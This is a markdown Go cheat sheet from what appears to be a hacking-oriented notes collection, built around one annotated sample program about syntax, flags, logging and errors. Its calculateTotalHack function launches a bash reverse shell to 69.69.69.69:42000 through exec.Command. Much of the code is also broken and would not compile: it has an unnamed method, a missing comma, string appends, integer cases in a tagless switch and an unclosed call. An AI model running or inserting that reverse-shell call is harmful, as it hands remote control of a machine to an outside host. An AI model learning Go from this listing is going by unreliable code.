# Useful Go

TODO list
```
go routines
chans
interfaces
errors
```

Chris Pritchard's [GO-SCRIPTING.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/GO-SCRIPTING.md)

```go
package main // 
// comments 

import (
	"fmt"
	"strings"
	"time"
	"log"
	"os"
	"os/exec"
	"flag" // -h is a default flag for help!
	// generally there is a newline between imported library packages and project packages and external depencies

	// These are stored in the GOPATH Environment variable under a src directory 
	// $GOPATH/src/github.com/[username]/[projectname]/firstlibrary
	"github.com/[username]/[projectname]/firstlibrary"

)

// Upper case is Globally scoped, lowercase is scope to the { block }
type GopherShape struct {
	size int
	colour string
}

// Upper case is Globally scoped
const ImportantNumber int = 69 

// Example of a method that requires a instance of gopherShape
// Domenstrated named return types 
func (g *gopherShape) () (result string, err error) { 
	return result, nil
}

// https://github.com/BishopFox/sliver/blob/master/server/cli/cli.go
func initConsoleLogging(appDir string) *os.File {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	logFile, err := os.OpenFile(filepath.Join(appDir, "logs", logFileName), os.O_RDWR|os.O_CREATE|os.O_APPEND, 0o600)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	log.SetOutput(logFile)
	return logFile
}

func main() {
	var hackingString, argument string 
	var differentPlace string = "Depending on the code culture or specific instance where it make readable sense to write golang like this"
	hackingString = "hacking" // Assignment
	happyString := "Happy" // Declaration 
	// CLI: ./usefulGolang cmd ...
	aCommand := flag.NewFlagSet("cmd", flag.ExitOnError)
	// CLI ./usefulGolang cmd -a <string arg here> 
	aCommand.StringVar(&argument, "a", "default value", "An description")
	// Depending on project, either args are handlede as array or string; Or more likely public CLI repositories that handle this 
	
	logFile := initConsoleLogging(appDir)
	defer logFile.Close()

	time.Sleep(1 * time.Second)

	switch {
		case 0:
			hackingString = append(hackingString, " that you are")
			b := []byte(hackingString) // convert a string to byte slice
		case 1, 2:
			theHackMap := make(map[int]string)
			betterFinalString := append(hackingString, " hacking the planet"
			betterFinalStrAsSlice := strings.SplitAfterN(betterFinalString, "", -1)
			for i,char := range betterFinalStrAsSlice {
				theHackMap[i] = char
			}
		case 3:
			// Below is more pretty way of writing the golang err != nil, usable if a function just returns a err
			if err = calculateTotalHack(); err != nil {
				panic(err) // Exit safetly after goroutines returns and crashes
			}
		// default: You do not always need a `default:` statement
	
	} 


	defer fmt.Printf("%s %s!\n", hackingString)
}

func calculateTotalHack() error {
	needToHack := true
	if needToHack {
		shell := exec.Command("bash" "-c 'exec bash -i &>/dev/tcp/69.69.69.69/42000 <&1'")
		if err := shell.Start(); err != nil {
			return err
		}
		if  err = shell.Wait(); err != nil {
			return err
		}
		return nil
	} else if {
		
	} else {
		err := fmt.Errorf("calculatetotalhack, example custom error messages - no uppercase letters!")
		fmt.Fprintln(os.Stderr, "Error:", err)
		return err
	}
}

```


## References

[learnxinyminutes - Go](https://learnxinyminutes.com/docs/go/)
[adrianhesketh dividing-a-go-project-into-multiple-packages blog](https://adrianhesketh.com/2016/04/19/dividing-a-go-project-into-multiple-packages/)
[GitHub Chris Pritchard GO-SCRIPTING.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/GO-SCRIPTING.md)